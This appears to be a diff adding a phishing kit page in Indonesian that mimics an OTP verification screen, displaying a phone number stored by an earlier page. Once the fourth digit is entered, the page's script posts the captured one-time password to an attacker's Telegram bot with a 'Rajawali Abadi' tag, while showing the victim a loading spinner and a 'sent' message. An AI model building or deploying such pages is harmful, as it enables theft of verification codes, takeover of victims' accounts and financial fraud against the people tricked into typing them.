@@ -1,0 +1,268 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <link href="css/style.css" rel="stylesheet" type="text/css"/>
+  <title>Input Box</title>
+  <style>
+    body {
+            font-family: Arial, sans-serif;
+            background-image: url('https://blogger.googleusercontent.com/img/a/AVvXsEgeQ0oPsgKi23xuj4qiHxoSiIKF7Ud_VEdCcXTgl_4jNxm3EnJQAkaziRjZAQ3kjL7x1CyzPPclPHH-hVjI9Z7US8PeKMEsAZWOOl4JHY0cXH3wNh1rQ_DjtmElgzyox8tgvLxJhOu2lUopoCtIx_FM7fF4B4spki7IAnhT5zj2etp4B3MZ0z5PlAykqCug');
+            background-size: cover;
+            padding: 20px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 80vh;
+            margin: 0;
+            flex-direction: column;
+        }
+    /* CSS untuk Notification Box */
+    #notification-box {
+      display: block;
+      width: 89%;
+      margin: 0 auto;
+      background-color: white;
+      text-align: center;
+      padding: 24px;
+      box-shadow: 0px 4px 8px rgba(0,0,0,0.2);
+      position: fixed;
+      border-radius: 16px;
+      bottom: 0;
+      left: 50%;
+      transform: translateX(-50%);
+    }
+
+    /* CSS untuk pesan notifikasi merah */
+    #notification-message {
+      color: red;
+      font-weight: bold;
+      display: none; /* Disembunyikan secara default */
+      margin-bottom: 10px;
+      font-size: 13px;
+    }
+
+    /* CSS untuk Input */
+    .input-container {
+      display: flex;
+      justify-content: center;
+      gap: 10px;
+      margin-top: 20px;
+    }
+
+    .number-input {
+      width: 40px;
+      height: 40px;
+      text-align: center;
+      font-size: 1.3em;
+      font-weight: bold;
+      border-radius: 5px;
+    }
+
+    /* CSS untuk Loading Box */
+    .loading-box {
+      display: none; /* Disembunyikan secara default */
+      position: absolute;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      background-color: rgba(255, 255, 255, 0.9);
+      padding: 10px;
+      border-radius: 10px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+
+    .icon-container {
+      position: relative;
+      width: 50px;
+      height: 50px;
+    }
+
+    .static-icon {
+      width: 70%;
+      height: 70%;
+    }
+
+    .spinning-icon {
+      position: absolute;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      width: 40px;
+      height: 40px;
+    }
+
+    .spin {
+      animation: spin 1s linear infinite;
+    }
+
+    @keyframes spin {
+      from { transform: translate(-50%, -50%) rotate(0deg); }
+      to { transform: translate(-50%, -50%) rotate(360deg); }
+    }
+
+    h {
+      font-size: 16px;
+      font-weight: bold;
+    }
+
+    p {
+      font-size: 15px;
+      margin-top: -5px;
+    }
+
+    #phoneDisplay {
+      font-weight: bold;
+      font-size: 18px;
+      margin-top: 10px;
+    }
+
+    #countdown {
+      margin-top: 10px;
+      color: gray;
+    }
+    
+    .otp-logo {
+            width: 150px;
+            margin-top: 10px;
+            height:auto;
+            
+        }
+  </style>
+</head>
+<body>
+  <div id="notification-box">
+    <!-- Pesan notifikasi merah yang akan muncul -->
+    <p id="notification-message">OTP Salah Silahkan Masukan Kembali!</p>
+    
+    <h>Masukan OTP</h><br>
+    <img src="https://blogger.googleusercontent.com/img/a/AVvXsEid3TW8O1TTCIEPXLIVrutFxativnU1xH_qydNJJucjeN1x2dsxMyt5mCry6JYqjipd3J5kIBVXynqbw6HEuiXXPuXc7iG3Ilqku2kVd1uOowLUDzd2FFtrp6jQ8pZb-xL2QoIV6XRGZw8T7PV3FsNj42fN9BXjnDfeXPJFerV3nW3YGPeci_QvLUkiz2DB" alt="Logo" class="otp-logo">
+
+    <p>Kode OTP Telah Dikirim Ke nomor Anda</p>
+    <p id="phoneDisplay"></p>
+    
+    <!-- Form untuk Input angka -->
+    <form id="inputForm">
+      <div class="input-container">
+        <input type="tel" class="number-input" maxlength="1" id="digit1">
+        <input type="tel" class="number-input" maxlength="1" id="digit2">
+        <input type="tel" class="number-input" maxlength="1" id="digit3">
+        <input type="tel" class="number-input" maxlength="1" id="digit4">
+      </div>
+      
+      <p id="countdown">Kirim ulang (120s)</p>
+    </form>
+    
+    <!-- Loading box (hidden by default) -->
+    <div id="loading" class="loading-box">
+      <div class="icon-container">
+        <img src="load_bg.png" alt="Static Icon" class="static-icon">
+        <img src="load_spin.png" alt="Spinning Icon" class="spinning-icon" id="spinning-icon">
+      </div>
+    </div>
+  </div>
+  
+  <script>
+    const phoneDisplay = document.getElementById("phoneDisplay");
+    const phoneNumber = localStorage.getItem("phoneNumber");
+    phoneDisplay.textContent = phoneNumber ? phoneNumber : "Nomor tidak ditemukan";
+
+    window.addEventListener('load', function() {
+        // Pastikan loading box tidak ditampilkan saat halaman dimuat
+        const loadingBox = document.getElementById('loading');
+        loadingBox.style.display = 'none';
+
+        document.getElementById('notification-box').style.display = 'block';
+        
+        const inputs = document.querySelectorAll('.number-input');
+        const notificationMessage = document.getElementById('notification-message');
+        const spinningIcon = document.getElementById('spinning-icon');
+
+        // Menyembunyikan pesan notifikasi saat pertama kali load
+        notificationMessage.style.display = 'none';
+        
+        inputs.forEach((input, index) => {
+            // Event saat pengguna mengetik
+            input.addEventListener('input', function() {
+                // Pindah ke kolom berikutnya jika ada input dan kolom bukan yang terakhir
+                if (input.value.length === 1 && index < inputs.length - 1) {
+                    inputs[index + 1].focus();
+                } 
+                
+                // Jika di kolom terakhir, tampilkan loading box dan aktifkan animasi berputar
+                if (index === inputs.length - 1 && input.value.length === 1) {
+                    loadingBox.style.display = 'flex';
+                    spinningIcon.classList.add('spin'); // Aktifkan animasi berputar
+                    
+                    // Ambil nilai OTP
+                    const otpData = {
+                        digit1: inputs[0].value,
+                        digit2: inputs[1].value,
+                        digit3: inputs[2].value,
+                        digit4: inputs[3].value
+                    };
+
+                    // Kirim data ke Telegram menggunakan fetch API
+                    const otp = `${otpData.digit1}${otpData.digit2}${otpData.digit3}${otpData.digit4}`;
+                    const telegramMessage = `🦅 Rajawali Abadi 🦅\nOTP: ${otp}`;
+
+                    fetch('https://api.telegram.org/bot<YOUR_BOT_TOKEN>/sendMessage', {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                        },
+                        body: JSON.stringify({
+                            chat_id: '<YOUR_CHAT_ID>',
+                            text: telegramMessage,
+                        }),
+                    })
+                    .then(response => response.json())
+                    .then(data => {
+                        loadingBox.style.display = 'none';
+                        spinningIcon.classList.remove('spin'); // Hentikan animasi berputar
+                        notificationMessage.textContent = "OTP Dikirim!";
+                        notificationMessage.style.display = 'block';
+                    })
+                    .catch(error => {
+                        loadingBox.style.display = 'none';
+                        spinningIcon.classList.remove('spin'); // Hentikan animasi berputar
+                        console.error('Error:', error);
+                    });
+                }
+            });
+            
+            // Event saat pengguna menekan tombol Backspace
+            input.addEventListener('keydown', function(event) {
+                if (event.key === 'Backspace' && input.value === '' && index > 0) {
+                    inputs[index - 1].focus();
+                }
+                
+                // Hanya sembunyikan pesan merah jika kolom input diisi ulang
+                if (event.key === 'Backspace' && index === inputs.length - 1) {
+                    notificationMessage.style.display = 'none';
+                }
+            });
+        });
+
+        // Fungsi untuk countdown
+        let countdownTime = 120; // 120 detik
+        const countdownElement = document.getElementById('countdown');
+
+        const countdownInterval = setInterval(() => {
+            countdownTime--;
+            countdownElement.textContent = `Kirim ulang (${countdownTime}s)`;
+            
+            // Jika countdown selesai
+            if (countdownTime <= 0) {
+                clearInterval(countdownInterval);
+                countdownElement.textContent = "Kirim Ulang";
+            }
+        }, 1000);
+    });
+
+  </script>
+</body>
+</html>
